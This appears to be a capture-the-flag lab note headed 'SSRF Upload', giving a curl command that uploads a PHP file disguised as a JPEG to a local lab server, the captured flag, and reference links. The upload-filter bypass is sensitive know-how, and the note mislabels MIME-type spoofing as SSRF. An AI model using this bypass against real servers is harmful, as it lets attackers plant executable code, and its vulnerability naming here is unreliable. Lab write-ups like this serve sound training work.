# SSRF Upload

Server-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing.

## Notes

Form enctype="multipart/form-data"

```bash
curl -H 'Content-Type: multipart/form-data' -F 'Upload=Upload' -F 'uploaded=@test.php;type=image/jpeg' -X POST http://172.20.10.9/\?page\=upload -o save.txt
```

The flag is: 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8

## PROBLEM FOUND:

Changing the file type, that we are going to upload, we can succesfully set any file.

## Info

[curl](https://gist.github.com/subfuzion/08c5d85437d5d4f00e58
[kontra](https://application.security/free-application-security-training/server-side-request-forgery-in-capital-one
[ssrf](https://portswigger.net/web-security/ssrf
[flag](http://www.javascriptkit.com/javatutors/valid2.shtml
